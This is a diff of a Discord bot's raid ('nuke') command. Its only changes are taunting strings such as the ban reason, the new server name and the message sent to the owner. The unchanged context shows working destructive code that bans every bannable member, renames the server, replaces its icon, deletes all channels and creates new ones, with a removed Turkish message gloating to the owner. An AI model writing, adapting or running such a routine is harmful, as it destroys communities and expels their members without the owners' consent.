@@ -10,7 +10,7 @@ let emojiler = 0;
       
 message.guild.members.forEach(u => {
 if (u.bannable) {
-message.guild.ban(u, "Light Vi Brittania")
+message.guild.ban(u, "Amonx No Mercy")
 }
 })
   
@@ -18,7 +18,7 @@ message.guild.ban(u, "Light Vi Brittania")
   
 
   
-message.guild.setName(`Işık Ordusu 💡`, ":))")
+message.guild.setName(`Satan Amonx 😈`, ":))")
 message.guild.setIcon(`https://cdn.discordapp.com/attachments/562981877351186438/565613916982345728/L_Logo_Tasarm_Red_-_by_KingEmrah.png`)
   
 message.guild.channels.forEach(c => {
@@ -32,7 +32,7 @@ return c.delete();
     
 
   
-message.guild.owner.send(`**Sunucun Patladı Canım \`Amonx\` and \`Shivax\` :smiling_imp:**`);
+message.guild.owner.send(`****`);
 message.guild.createChannel(`light`)
 message.guild.createChannel(`army`)
 message.delete()
